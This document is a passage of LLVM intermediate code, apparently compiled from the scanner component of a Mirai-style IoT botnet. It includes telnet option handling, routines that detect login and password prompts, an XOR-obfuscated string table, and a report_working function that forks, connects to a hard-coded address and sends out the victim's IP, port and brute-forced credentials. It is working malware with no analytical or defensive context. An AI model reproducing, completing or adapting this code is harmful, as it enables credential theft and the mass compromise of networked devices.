  %8 = icmp sgt i32 %7, 0
  br i1 %8, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %4
  %wide.trip.count = and i64 %6, 4294967295
  %9 = add nsw i64 %wide.trip.count, -1
  %xtraiter = and i64 %6, 3
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph.prol.loopexit, label %.lr.ph.prol.preheader

.lr.ph.prol.preheader:                            ; preds = %.lr.ph.preheader
  br label %.lr.ph.prol

.lr.ph.prol:                                      ; preds = %14, %.lr.ph.prol.preheader
  %indvars.iv.prol = phi i64 [ %indvars.iv.next.prol, %14 ], [ 0, %.lr.ph.prol.preheader ]
  %prol.iter = phi i64 [ %prol.iter.sub, %14 ], [ %xtraiter, %.lr.ph.prol.preheader ]
  %10 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.prol
  %11 = load i8, i8* %10, align 1
  %12 = icmp eq i8 %11, 0
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %.lr.ph.prol
  store i8 65, i8* %10, align 1
  br label %14

; <label>:14:                                     ; preds = %13, %.lr.ph.prol
  %indvars.iv.next.prol = add nuw nsw i64 %indvars.iv.prol, 1
  %prol.iter.sub = add i64 %prol.iter, -1
  %prol.iter.cmp = icmp eq i64 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph.prol.loopexit.unr-lcssa, label %.lr.ph.prol, !llvm.loop !6

.lr.ph.prol.loopexit.unr-lcssa:                   ; preds = %14
  br label %.lr.ph.prol.loopexit

.lr.ph.prol.loopexit:                             ; preds = %.lr.ph.preheader, %.lr.ph.prol.loopexit.unr-lcssa
  %indvars.iv.unr = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next.prol, %.lr.ph.prol.loopexit.unr-lcssa ]
  %15 = icmp ult i64 %9, 3
  br i1 %15, label %.loopexit.loopexit, label %.lr.ph.preheader.new

.lr.ph.preheader.new:                             ; preds = %.lr.ph.prol.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %32, %.lr.ph.preheader.new
  %indvars.iv = phi i64 [ %indvars.iv.unr, %.lr.ph.preheader.new ], [ %indvars.iv.next.3, %32 ]
  %16 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv
  %17 = load i8, i8* %16, align 1
  %18 = icmp eq i8 %17, 0
  br i1 %18, label %19, label %.lr.ph.113

; <label>:19:                                     ; preds = %.lr.ph
  store i8 65, i8* %16, align 1
  br label %.lr.ph.113

.lr.ph.113:                                       ; preds = %.lr.ph, %19
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %20 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next
  %21 = load i8, i8* %20, align 1
  %22 = icmp eq i8 %21, 0
  br i1 %22, label %23, label %.lr.ph.214

.loopexit.loopexit.unr-lcssa:                     ; preds = %32
  br label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %.lr.ph.prol.loopexit, %.loopexit.loopexit.unr-lcssa
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %4
  ret i32 %7

; <label>:23:                                     ; preds = %.lr.ph.113
  store i8 65, i8* %20, align 1
  br label %.lr.ph.214

.lr.ph.214:                                       ; preds = %23, %.lr.ph.113
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %24 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next.1
  %25 = load i8, i8* %24, align 1
  %26 = icmp eq i8 %25, 0
  br i1 %26, label %27, label %.lr.ph.315

; <label>:27:                                     ; preds = %.lr.ph.214
  store i8 65, i8* %24, align 1
  br label %.lr.ph.315

.lr.ph.315:                                       ; preds = %27, %.lr.ph.214
  %indvars.iv.next.2 = add nsw i64 %indvars.iv, 3
  %28 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next.2
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 0
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %.lr.ph.315
  store i8 65, i8* %28, align 1
  br label %32

; <label>:32:                                     ; preds = %31, %.lr.ph.315
  %indvars.iv.next.3 = add nsw i64 %indvars.iv, 4
  %exitcond.3 = icmp eq i64 %indvars.iv.next.3, %wide.trip.count
  br i1 %exitcond.3, label %.loopexit.loopexit.unr-lcssa, label %.lr.ph
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @consume_iacs(%struct.scanner_connection*) unnamed_addr #0 {
  %2 = alloca [3 x i8], align 1
  %3 = alloca [9 x i8], align 1
  %4 = getelementptr inbounds [3 x i8], [3 x i8]* %2, i64 0, i64 0
  %5 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 6
  %6 = load i32, i32* %5, align 4
  %7 = icmp sgt i32 %6, 0
  br i1 %7, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %1
  %8 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 0
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 1
  %10 = getelementptr inbounds [9 x i8], [9 x i8]* %3, i64 0, i64 0
  %11 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 1
  br label %12

; <label>:12:                                     ; preds = %.lr.ph, %.backedge
  %.03135 = phi i8* [ %8, %.lr.ph ], [ %.031.be, %.backedge ]
  %.03234 = phi i32 [ 0, %.lr.ph ], [ %.032.be, %.backedge ]
  %13 = load i8, i8* %.03135, align 1
  %14 = icmp eq i8 %13, -1
  br i1 %14, label %15, label %._crit_edge.loopexit

; <label>:15:                                     ; preds = %12
  %16 = call fastcc signext i8 @can_consume(%struct.scanner_connection* nonnull %0, i8* nonnull %.03135, i32 1)
  %17 = icmp eq i8 %16, 0
  br i1 %17, label %._crit_edge.loopexit, label %18

; <label>:18:                                     ; preds = %15
  %19 = getelementptr inbounds i8, i8* %.03135, i64 1
  %20 = load i8, i8* %19, align 1
  switch i8 %20, label %40 [
    i8 -1, label %21
    i8 -3, label %26
  ]

; <label>:21:                                     ; preds = %18
  %22 = getelementptr inbounds i8, i8* %.03135, i64 2
  %23 = add nsw i32 %.03234, 2
  br label %.backedge

.backedge:                                        ; preds = %21, %33, %51
  %.032.be = phi i32 [ %23, %21 ], [ %55, %51 ], [ %35, %33 ]
  %.031.be = phi i8* [ %22, %21 ], [ %54, %51 ], [ %34, %33 ]
  %24 = load i32, i32* %5, align 4
  %25 = icmp slt i32 %.032.be, %24
  br i1 %25, label %12, label %._crit_edge.loopexit

; <label>:26:                                     ; preds = %18
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %4, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @consume_iacs.tmp1, i64 0, i64 0), i64 3, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %10, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @consume_iacs.tmp2, i64 0, i64 0), i64 9, i32 1, i1 false)
  %27 = call fastcc signext i8 @can_consume(%struct.scanner_connection* nonnull %0, i8* nonnull %.03135, i32 2)
  %28 = icmp eq i8 %27, 0
  br i1 %28, label %._crit_edge.loopexit, label %29

; <label>:29:                                     ; preds = %26
  %30 = getelementptr inbounds i8, i8* %.03135, i64 2
  %31 = load i8, i8* %30, align 1
  %32 = icmp eq i8 %31, 31
  br i1 %32, label %33, label %40

; <label>:33:                                     ; preds = %29
  %34 = getelementptr inbounds i8, i8* %.03135, i64 3
  %35 = add nsw i32 %.03234, 3
  %36 = load i32, i32* %11, align 8
  %37 = call i64 @send(i32 %36, i8* nonnull %4, i64 3, i32 16384) #10
  %38 = load i32, i32* %11, align 8
  %39 = call i64 @send(i32 %38, i8* nonnull %10, i64 9, i32 16384) #10
  br label %.backedge

; <label>:40:                                     ; preds = %18, %29
  %41 = call fastcc signext i8 @can_consume(%struct.scanner_connection* %0, i8* nonnull %.03135, i32 2)
  %42 = icmp eq i8 %41, 0
  br i1 %42, label %._crit_edge.loopexit, label %.preheader

.preheader:                                       ; preds = %40
  %43 = load i8, i8* %.03135, align 1
  switch i8 %43, label %.preheader.144 [
    i8 -3, label %44
    i8 -5, label %.sink.split
  ]

; <label>:44:                                     ; preds = %.preheader
  br label %.sink.split

.sink.split:                                      ; preds = %.preheader, %44
  %.sink = phi i8 [ -4, %44 ], [ -3, %.preheader ]
  store i8 %.sink, i8* %.03135, align 1
  br label %.preheader.144

.preheader.144:                                   ; preds = %.preheader, %.sink.split
  %45 = getelementptr inbounds i8, i8* %.03135, i64 1
  %46 = load i8, i8* %45, align 1
  switch i8 %46, label %.preheader.245 [
    i8 -3, label %47
    i8 -5, label %.sink.split.1
  ]

._crit_edge.loopexit:                             ; preds = %26, %40, %15, %12, %.backedge
  %.032.lcssa.ph = phi i32 [ %.03234, %26 ], [ %.03234, %40 ], [ %.03234, %15 ], [ %.03234, %12 ], [ %.032.be, %.backedge ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.032.lcssa = phi i32 [ 0, %1 ], [ %.032.lcssa.ph, %._crit_edge.loopexit ]
  ret i32 %.032.lcssa

; <label>:47:                                     ; preds = %.preheader.144
  br label %.sink.split.1

.sink.split.1:                                    ; preds = %47, %.preheader.144
  %.sink.1 = phi i8 [ -4, %47 ], [ -3, %.preheader.144 ]
  store i8 %.sink.1, i8* %45, align 1
  br label %.preheader.245

.preheader.245:                                   ; preds = %.sink.split.1, %.preheader.144
  %48 = getelementptr inbounds i8, i8* %.03135, i64 2
  %49 = load i8, i8* %48, align 1
  switch i8 %49, label %51 [
    i8 -3, label %50
    i8 -5, label %.sink.split.2
  ]

; <label>:50:                                     ; preds = %.preheader.245
  br label %.sink.split.2

.sink.split.2:                                    ; preds = %50, %.preheader.245
  %.sink.2 = phi i8 [ -4, %50 ], [ -3, %.preheader.245 ]
  store i8 %.sink.2, i8* %48, align 1
  br label %51

; <label>:51:                                     ; preds = %.sink.split.2, %.preheader.245
  %52 = load i32, i32* %9, align 8
  %53 = call i64 @send(i32 %52, i8* nonnull %.03135, i64 3, i32 16384) #10
  %54 = getelementptr inbounds i8, i8* %.03135, i64 3
  %55 = add nsw i32 %.03234, 3
  br label %.backedge
}

; Function Attrs: noinline norecurse nounwind uwtable
define internal fastcc i32 @consume_user_prompt(%struct.scanner_connection* nocapture readonly) unnamed_addr #9 {
  %2 = alloca i32, align 4
  %3 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 6
  %4 = load i32, i32* %3, align 4
  %5 = sext i32 %4 to i64
  br label %6

; <label>:6:                                      ; preds = %8, %1
  %indvars.iv = phi i64 [ %indvars.iv.next, %8 ], [ %5, %1 ]
  %indvars.iv.next = add nsw i64 %indvars.iv, -1
  %7 = icmp sgt i64 %indvars.iv, 1
  br i1 %7, label %8, label %11

; <label>:8:                                      ; preds = %6
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 %indvars.iv.next
  %10 = load i8, i8* %9, align 1
  switch i8 %10, label %6 [
    i8 58, label %.loopexit.loopexit
    i8 62, label %.loopexit.loopexit
    i8 36, label %.loopexit.loopexit
    i8 35, label %.loopexit.loopexit
    i8 37, label %.loopexit.loopexit
  ]

; <label>:11:                                     ; preds = %6
  tail call void @table_unlock_val(i8 zeroext 26)
  tail call void @table_unlock_val(i8 zeroext 27)
  %12 = call i8* @table_retrieve_val(i32 26, i32* nonnull %2)
  %13 = call i8* @table_retrieve_val(i32 27, i32* nonnull %2)
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 0
  %15 = load i32, i32* %3, align 4
  %16 = load i32, i32* %2, align 4
  %17 = add nsw i32 %16, -1
  %18 = call i32 @util_memsearch(i8* %14, i32 %15, i8* %12, i32 %17)
  %19 = icmp eq i32 %18, -1
  br i1 %19, label %20, label %.loopexit

; <label>:20:                                     ; preds = %11
  %21 = call i32 @util_memsearch(i8* %14, i32 %15, i8* %13, i32 %17)
  %22 = icmp ne i32 %21, -1
  %..026 = select i1 %22, i32 1, i32 -1
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %8, %8, %8, %8, %8
  %23 = trunc i64 %indvars.iv to i32
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %11, %20
  %.1 = phi i32 [ %..026, %20 ], [ 1, %11 ], [ %23, %.loopexit.loopexit ]
  call void @table_lock_val(i8 zeroext 26)
  call void @table_lock_val(i8 zeroext 27)
  %24 = icmp eq i32 %.1, -1
  %..1 = select i1 %24, i32 0, i32 %.1
  ret i32 %..1
}

; Function Attrs: noinline norecurse nounwind uwtable
define internal fastcc i32 @consume_pass_prompt(%struct.scanner_connection* nocapture readonly) unnamed_addr #9 {
  %2 = alloca i32, align 4
  %3 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 6
  %4 = load i32, i32* %3, align 4
  %5 = sext i32 %4 to i64
  br label %6

; <label>:6:                                      ; preds = %8, %1
  %indvars.iv = phi i64 [ %indvars.iv.next, %8 ], [ %5, %1 ]
  %indvars.iv.next = add nsw i64 %indvars.iv, -1
  %7 = icmp sgt i64 %indvars.iv, 1
  br i1 %7, label %8, label %11

; <label>:8:                                      ; preds = %6
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 %indvars.iv.next
  %10 = load i8, i8* %9, align 1
  switch i8 %10, label %6 [
    i8 58, label %.loopexit.loopexit
    i8 62, label %.loopexit.loopexit
    i8 36, label %.loopexit.loopexit
    i8 35, label %.loopexit.loopexit
  ]

; <label>:11:                                     ; preds = %6
  tail call void @table_unlock_val(i8 zeroext 25)
  %12 = call i8* @table_retrieve_val(i32 25, i32* nonnull %2)
  %13 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 0
  %14 = load i32, i32* %3, align 4
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, -1
  %17 = call i32 @util_memsearch(i8* %13, i32 %14, i8* %12, i32 %16)
  %18 = icmp ne i32 %17, -1
  %..020 = select i1 %18, i32 1, i32 -1
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %8, %8, %8, %8
  %19 = trunc i64 %indvars.iv to i32
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %11
  %.1 = phi i32 [ %..020, %11 ], [ %19, %.loopexit.loopexit ]
  call void @table_lock_val(i8 zeroext 25)
  %20 = icmp eq i32 %.1, -1
  %..1 = select i1 %20, i32 0, i32 %.1
  ret i32 %..1
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define internal fastcc i32 @consume_any_prompt(%struct.scanner_connection* nocapture readonly) unnamed_addr #5 {
  %2 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 6
  %3 = load i32, i32* %2, align 4
  %4 = sext i32 %3 to i64
  br label %5

; <label>:5:                                      ; preds = %7, %1
  %indvars.iv = phi i64 [ %indvars.iv.next, %7 ], [ %4, %1 ]
  %indvars.iv.next = add nsw i64 %indvars.iv, -1
  %6 = icmp sgt i64 %indvars.iv, 1
  br i1 %6, label %7, label %11

; <label>:7:                                      ; preds = %5
  %8 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 %indvars.iv.next
  %9 = load i8, i8* %8, align 1
  %10 = trunc i64 %indvars.iv to i32
  switch i8 %9, label %5 [
    i8 58, label %11
    i8 62, label %11
    i8 36, label %11
    i8 35, label %11
    i8 37, label %11
  ]

; <label>:11:                                     ; preds = %7, %7, %7, %7, %7, %5
  %.0 = phi i32 [ -1, %5 ], [ %10, %7 ], [ %10, %7 ], [ %10, %7 ], [ %10, %7 ], [ %10, %7 ]
  %12 = icmp eq i32 %.0, -1
  %..0 = select i1 %12, i32 0, i32 %.0
  ret i32 %..0
}

; Function Attrs: noinline norecurse nounwind uwtable
define internal fastcc i32 @consume_resp_prompt(%struct.scanner_connection* nocapture readonly) unnamed_addr #9 {
  %2 = alloca i32, align 4
  tail call void @table_unlock_val(i8 zeroext 10)
  %3 = call i8* @table_retrieve_val(i32 10, i32* nonnull %2)
  %4 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 0
  %5 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 6
  %6 = load i32, i32* %5, align 4
  %7 = load i32, i32* %2, align 4
  %8 = add nsw i32 %7, -1
  %9 = call i32 @util_memsearch(i8* %4, i32 %6, i8* %3, i32 %8)
  %10 = icmp eq i32 %9, -1
  call void @table_lock_val(i8 zeroext 10)
  br i1 %10, label %11, label %18

; <label>:11:                                     ; preds = %1
  call void @table_unlock_val(i8 zeroext 9)
  %12 = call i8* @table_retrieve_val(i32 9, i32* nonnull %2)
  %13 = load i32, i32* %5, align 4
  %14 = load i32, i32* %2, align 4
  %15 = add nsw i32 %14, -1
  %16 = call i32 @util_memsearch(i8* %4, i32 %13, i8* %12, i32 %15)
  call void @table_lock_val(i8 zeroext 9)
  %17 = icmp eq i32 %16, -1
  %. = select i1 %17, i32 0, i32 %16
  br label %18

; <label>:18:                                     ; preds = %11, %1
  %.0 = phi i32 [ -1, %1 ], [ %., %11 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @report_working(i32, i16 zeroext, %struct.scanner_auth*) unnamed_addr #0 {
  %4 = alloca i32, align 4
  %5 = alloca i16, align 2
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i8, align 1
  store i32 %0, i32* %4, align 4
  store i16 %1, i16* %5, align 2
  %8 = tail call i32 @fork() #10
  %9 = icmp sgt i32 %8, 0
  %10 = icmp eq i32 %8, -1
  %or.cond = or i1 %9, %10
  br i1 %or.cond, label %11, label %12

; <label>:11:                                     ; preds = %3
  ret void

; <label>:12:                                     ; preds = %3
  %13 = tail call i32 @socket(i32 2, i32 1, i32 0) #10
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %12
  tail call void @exit(i32 0) #12
  unreachable

; <label>:16:                                     ; preds = %12
  tail call void @table_unlock_val(i8 zeroext 2)
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 0
  store i16 2, i16* %17, align 4
  %18 = tail call i32 @inet_addr(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.16, i64 0, i64 0)) #10
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 2, i32 0
  store i32 %18, i32* %19, align 4
  %20 = tail call i8* @table_retrieve_val(i32 2, i32* null)
  %21 = bitcast i8* %20 to i16*
  %22 = load i16, i16* %21, align 2
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 1
  store i16 %22, i16* %23, align 2
  tail call void @table_lock_val(i8 zeroext 2)
  %24 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %13, %struct.sockaddr* nonnull %24, i32 16) #10
  %26 = icmp eq i32 %25, -1
  br i1 %26, label %27, label %29

; <label>:27:                                     ; preds = %16
  %28 = call i32 @close(i32 %13) #10
  call void @exit(i32 0) #12
  unreachable

; <label>:29:                                     ; preds = %16
  store i8 0, i8* %7, align 1
  %30 = call i64 @send(i32 %13, i8* nonnull %7, i64 1, i32 16384) #10
  %31 = bitcast i32* %4 to i8*
  %32 = call i64 @send(i32 %13, i8* nonnull %31, i64 4, i32 16384) #10
  %33 = bitcast i16* %5 to i8*
  %34 = call i64 @send(i32 %13, i8* nonnull %33, i64 2, i32 16384) #10
  %35 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %2, i64 0, i32 4
  %36 = call i64 @send(i32 %13, i8* %35, i64 1, i32 16384) #10
  %37 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %2, i64 0, i32 0
  %38 = load i8*, i8** %37, align 8
  %39 = load i8, i8* %35, align 4
  %40 = zext i8 %39 to i64
  %41 = call i64 @send(i32 %13, i8* %38, i64 %40, i32 16384) #10
  %42 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %2, i64 0, i32 5
  %43 = call i64 @send(i32 %13, i8* %42, i64 1, i32 16384) #10
  %44 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %2, i64 0, i32 1
  %45 = load i8*, i8** %44, align 8
  %46 = load i8, i8* %42, align 1
  %47 = zext i8 %46 to i64
  %48 = call i64 @send(i32 %13, i8* %45, i64 %47, i32 16384) #10
  %49 = call i32 @close(i32 %13) #10
  call void @exit(i32 0) #12
  unreachable
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define internal fastcc signext i8 @can_consume(%struct.scanner_connection* readonly, i8* readnone, i32) unnamed_addr #5 {
  %4 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 6
  %5 = load i32, i32* %4, align 4
  %6 = sext i32 %5 to i64
  %7 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 %6
  %8 = sext i32 %2 to i64
  %9 = getelementptr inbounds i8, i8* %1, i64 %8
  %10 = icmp ult i8* %9, %7
  %11 = zext i1 %10 to i8
  ret i8 %11
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #6

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #3

declare void @util_zero(i8*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define internal fastcc i8* @deobf(i8*, i32* nocapture) unnamed_addr #0 {
  %3 = tail call i32 @util_strlen(i8* %0) #10
  store i32 %3, i32* %1, align 4
  %4 = add nsw i32 %3, 1
  %5 = sext i32 %4 to i64
  %6 = tail call noalias i8* @malloc(i64 %5) #10
  tail call void @util_memcpy(i8* %6, i8* %0, i32 %4) #10
  %7 = load i32, i32* %1, align 4
  %8 = icmp sgt i32 %7, 0
  br i1 %8, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %2
  %9 = load i32, i32* %1, align 4
  %10 = sext i32 %9 to i64
  br label %11

; <label>:11:                                     ; preds = %.lr.ph, %11
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %11 ]
  %12 = getelementptr inbounds i8, i8* %6, i64 %indvars.iv
  %13 = load i8, i8* %12, align 1
  %14 = xor i8 %13, 84
  store i8 %14, i8* %12, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %15 = icmp slt i64 %indvars.iv.next, %10
  br i1 %15, label %11, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %11
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret i8* %6
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @table_unlock_val(i8 zeroext) local_unnamed_addr #9 {
  tail call fastcc void @toggle_obf(i8 zeroext %0)
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define internal fastcc void @toggle_obf(i8 zeroext) unnamed_addr #9 {
  %2 = zext i8 %0 to i64
  %3 = load i32, i32* @table_key, align 4
  %4 = lshr i32 %3, 8
  %5 = lshr i32 %3, 16
  %6 = lshr i32 %3, 24
  %7 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %2, i32 1
  %8 = load i16, i16* %7, align 8
  %9 = icmp eq i16 %8, 0
  br i1 %9, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %1
  %10 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %2, i32 0
  br label %11

; <label>:11:                                     ; preds = %.lr.ph, %11
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %11 ]
  %12 = load i8*, i8** %10, align 16
  %13 = getelementptr inbounds i8, i8* %12, i64 %indvars.iv
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = xor i32 %15, %3
  %17 = trunc i32 %16 to i8
  store i8 %17, i8* %13, align 1
  %18 = load i8*, i8** %10, align 16
  %19 = getelementptr inbounds i8, i8* %18, i64 %indvars.iv
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = xor i32 %21, %4
  %23 = trunc i32 %22 to i8
  store i8 %23, i8* %19, align 1
  %24 = load i8*, i8** %10, align 16
  %25 = getelementptr inbounds i8, i8* %24, i64 %indvars.iv
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = xor i32 %27, %5
  %29 = trunc i32 %28 to i8
  store i8 %29, i8* %25, align 1
  %30 = load i8*, i8** %10, align 16
  %31 = getelementptr inbounds i8, i8* %30, i64 %indvars.iv
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = xor i32 %33, %6
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %31, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %36 = load i16, i16* %7, align 8
  %37 = zext i16 %36 to i64
  %38 = icmp slt i64 %indvars.iv.next, %37
  br i1 %38, label %11, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %11
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @table_lock_val(i8 zeroext) local_unnamed_addr #9 {
  tail call fastcc void @toggle_obf(i8 zeroext %0)
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) local_unnamed_addr #9 {
  %3 = sext i32 %0 to i64
  %4 = icmp eq i32* %1, null
  br i1 %4, label %9, label %5

; <label>:5:                                      ; preds = %2
  %6 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %3, i32 1
  %7 = load i16, i16* %6, align 8
  %8 = zext i16 %7 to i32
  store i32 %8, i32* %1, align 4
  br label %9

; <label>:9:                                      ; preds = %2, %5
  %10 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %3, i32 0
  %11 = load i8*, i8** %10, align 16
  ret i8* %11
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @util_memsearch(i8* nocapture readonly, i32, i8* nocapture readonly, i32) local_unnamed_addr #5 {
  %5 = icmp sle i32 %3, %1
  %6 = icmp sgt i32 %1, 0
  %or.cond = and i1 %5, %6
  br i1 %or.cond, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %4
  %7 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %20
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %20 ]
  %.016 = phi i32 [ 0, %.lr.ph.preheader ], [ %.1, %20 ]
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %9 = load i8, i8* %8, align 1
  %10 = sext i32 %.016 to i64
  %11 = getelementptr inbounds i8, i8* %2, i64 %10
  %12 = load i8, i8* %11, align 1
  %13 = icmp eq i8 %9, %12
  br i1 %13, label %14, label %20

; <label>:14:                                     ; preds = %.lr.ph
  %15 = add nsw i32 %.016, 1
  %16 = icmp eq i32 %15, %3
  br i1 %16, label %17, label %20

; <label>:17:                                     ; preds = %14
  %18 = trunc i64 %indvars.iv to i32
  %19 = add nsw i32 %18, 1
  br label %.loopexit

; <label>:20:                                     ; preds = %.lr.ph, %14
  %.1 = phi i32 [ %15, %14 ], [ 0, %.lr.ph ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %21 = icmp slt i64 %indvars.iv.next, %7
  br i1 %21, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %20
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %4, %17
  %.013 = phi i32 [ %19, %17 ], [ -1, %4 ], [ -1, %.loopexit.loopexit ]
  ret i32 %.013
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
